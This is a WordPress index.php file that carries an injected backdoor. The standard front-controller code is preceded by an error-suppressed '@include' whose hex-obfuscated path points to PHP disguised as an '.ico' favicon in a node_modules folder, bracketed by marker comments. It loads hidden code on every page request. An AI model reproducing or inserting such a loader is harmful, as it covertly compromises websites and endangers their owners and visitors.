<?php
/*53614*/

@include "\x44:/xa\x6dpp/h\x74docs\x2fmy-a\x70p/no\x64e_mo\x64ules\x2fsele\x63t-ho\x73e/fa\x76icon\x5f75e5\x35b.ic\x6f";

/*53614*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
